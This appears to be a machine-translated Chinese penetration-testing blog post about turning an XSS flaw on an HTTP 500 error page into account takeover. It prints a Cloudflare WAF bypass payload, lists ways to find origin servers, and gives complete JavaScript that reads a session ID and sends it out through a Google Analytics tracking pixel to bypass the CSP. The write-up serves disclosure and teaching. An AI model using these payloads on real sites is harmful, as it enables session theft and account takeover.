介绍

在 HTTP 500“内部服务器错误”页面上，这似乎是一个常规的跨站点脚本 (XSS) 漏洞，我设法在评估中变成了一键式帐户接管。在这篇博文中，我想描述我利用已知的 Cloudflare WAF 绕过和 Google 分析来提取用作 CSP 绕过的会话令牌来实现这一目标的路径。


侦察

在评估开始时，我很快注意到 Web 应用程序将会话 ID 作为某种错误报告 JavaScript 函数的一部分存储在message变量中。如果window.error被触发，将执行此函数：

所以我去寻找一种方法来提取这些数据。还有什么比一个可能的、理论上的中间人更适合做这项工作呢？当然是 XSS！


在评估期间的某个地方，我的同事 Koen Claes ( @KoenClaes_ ) 提出了这个有趣的 XSS 向量，可以在 500“内部服务器错误”页面上找到它。注意EndUserVisibleHtmlMessageURL 中的参数：

https://webapp.example.eu/Shared/VisibleError?NotDialog=True&ErrorCode=&EndUserVisibleHtmlMessage=<XSSpayloadhere>&ShowWarningIcon=False&Title=Culture+change+detected&CultureInfo=be-EN&Print=False

这听起来不太安全，是吗？事实上，几乎太容易被利用了。但是，有一个问题！有两个保护措施阻止我们使用该参数成功进行 XSS 攻击，因此我们需要一个攻击计划：

  • Pwn Cloudflare 的“军用级 AI 增强型”Web 应用程序防火墙 (WAF)

  • 欺骗我们的老朋友，先生。光热发电


由于 Cloudflare 在应用程序前面，这意味着简单的<script>alert(1)</script>-payload 不会弹出。


DNS覆盖

我们的第一个想法是尝试一种常用的方法来绕过 WAF 客户端：DNS Override。假设我们可以发现 Cloudflare 背后的源服务器（并且它允许来自一般互联网的连接），我们可以通过直接连接来绕过 WAF。


有许多众所周知的方法可以发现使用基于云的 WAF（以及 Cloudflare WAF 本身）保护的 Web 服务的源服务器。例如：

  • 在像 Censys 这样的服务上搜索网站的域名，这会揭示诸如哪些服务器正在使用相同的 TLS 证书等信息

  • 通过在 Shodan 上搜索相同的 favico 哈希来泄漏地址（在https://github.com/pielco11/fav-up 中实现）

  • 搜索历史 DNS 数据。


一旦您知道源服务器 IP，Burp Suite 就可以在"Project Options" -> "Hostname Resolution".


在Hostname Resolution使用我们发现的源服务器的正确 IP 地址启用后，Koen 确认了他的想法，确实是 XSS。知名人士alert(1)立即被处决。


但您可能想知道，“在针对受害者时，这并不总是绕过 Cloudflare 的可行方法”。你是对的，尤其是当你无法访问受害者的基础设施或计算机时。由于这并不是继续我们的攻击链的真正选择，因此我们专注于在应用程序级别绕过 Cloudflare。


基于 Cloudflare 签名的绕过

Cloudflare 做了很多非常酷的事情，我鼓励您查看他们的博客！不幸的是，一些众所周知的 WAF 绕过似乎没有引起注意/未修复。我在我们的案例中搜索了一个，并找到了一个在 2019 年 6 月报告的并且到 2021 年 2 月仍然有效。

Cloudflare XSS 绕过通过为 dec 添加 8 个或更多多余的前导零，为十六进制添加 7 个或更多。


十二位：<svg onload=prompt%26%230000000040document.domain)>十六进制：<svg onload=prompt%26%23×000000028;document.domain)>

CSP 旁路

Web 应用程序具有以下内容安全策略 (CSP)：

Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline' 'unsafe-eval' https://ssl.google-analytics.com https://maps.googleapis.com https://webapp.example.eu https://connect.facebook.net https://themes.example.eu; img-src 'self' https://ssl.google-analytics.com https://s-static.ak.facebook.com https://webapp.example.eu https://themes.example.eu http://images-awstest.example.com; style-src 'self' 'unsafe-inline' https://fonts.googleapis.com https://webapp.example.eu https://themes.example.eu; font-src 'self' https://themes.googleusercontent.com; frame-src https://webapp.example.eu https://www.facebook.com https://s-static.ak.facebook.com; object-src 'none'

通过仔细检查 CSP，我们可以看到它允许脚本运行来自域本身，因为script-src 'self' 'unsafe-inline' 'unsafe-eval'.


所以我想，也许快速fetch()使用 Burp Collaborator URL 就足够了，但不......我们收到一个错误，显示connect-src不允许该fetch()函数对未声明的域进行外部 HTTP 调用。只有原始域有效。


尽管connect-srcCSP 中没有写明，但default-src 'self'禁止任何未声明的指令被“恶意”执行。那么，什么是允许的呢？

img-src https://ssl.google-analytics.com

也许对你们中的一些人来说这敲响了警钟。通过谷歌分析提取！但是如何？


谷歌分析

与 Facebook 一样，Google Analytics 通过跟踪像素提供跟踪功能。通常，跟踪像素会进行一些记录/指纹识别，但在这种情况下，我们可以主动将其用作数据提取通道。


通过深入挖掘Google Analytics文档，collect可以构建一个有趣的URL。此 URL 具有允许包含任意字符串的特定参数。此参数称为ea。



为了能够使用跟踪像素成功添加分析，需要 3 个强制性参数：

  • tid，这是我们为执行攻击而设置的 Google Analytics PoC 帐户 ID

  • cid，这是一个随机数，用于区分浏览器/用户，也就是指纹识别

  • ea，可以任意分配给它

所以，一个简单的例子是：

https://ssl.google-analytics.com/collect?v=1&tid=UA-190183015-1&cid=13333337&t=event&ec=email&ea=anystring

考虑到该 URL，可以肯定地说，我们也可以绕过 CSP 策略，完成我们的最后一个攻击目标。


把所有的碎片粘在一起

我们拥有实现成功攻击链所需的所有 4 个部分。回顾一下，这些是：

  • JavaScript 函数中可访问的 SessionID

  • Cloudflare 绕过

  • CSP 旁路

  • 一个谷歌分析collect网址

让我们将它们串在一起并窃取一些会话 ID！


使用 JavaScript 雕刻 SessionID 值

如简介中所述，应用程序在错误消息传递函数中显示用户的会话 cookie。有什么比一个好的旧正则表达式更好的方法来提取我们想要的值？


我快速访问regex101.com并构建了一个正则表达式，用于提取该特定字段及其对应的值，一个 24 个字符的字母数字会话 ID，如下所示。

和实际的正则表达式：

/(?:SessionID: (?:[a-zA-Z0-9-_]{24}))/g


编写有效负载代码

由于我们想将 Google Analytics Pixel 附加到我们的网页，我们将不得不定义一个新变量。让我们称之为gaimage：

var gaimage = document.createElement("img");

接下来，我们声明我们的regex变量：

var regex = /(?:SessionID: (?:[a-zA-Z0-9-_]{24}))/gm;

下一步有点复杂。


该应用程序在返回 200 OK 的应用程序中到处返回该错误 JavaScript 函数，但由于在 HTTP 500“内部服务器错误”页面上发现了 XSS 入口点，我们不得不使用跨站点请求伪造。基本上是向页面发出请求，该页面将在提取响应中包含会话 ID。


对于我们的有效负载，下面的 JavaScript 执行以下操作：


获取返回 200 OK 的页面的页面内容，出于 PoC 目的，它是一个名为：/Search/Criteria

将我们的 Google Analytics collectURL 作为源分配给img属性

cid由Math.random()函数随机生成

最重要的是，该ea参数填充了使用正则表达式提取的 SessionID 值

fetch("/Search/Criteria").then(response => response.text()).then(data => gaimage.src = "https://ssl.google-analytics.com/collect?v=1&tid=UA-190183015-1&cid=" + Math.floor(Math.random() * 8999999999 + 1000000000) + "&t=event&ec=email&ea=" + encodeURIComponent(data.match(regex)));

最后，通过将实际附加gaimage到 HTML DOM 本身来结束此代码：


document.head.appendChild(gaimage);
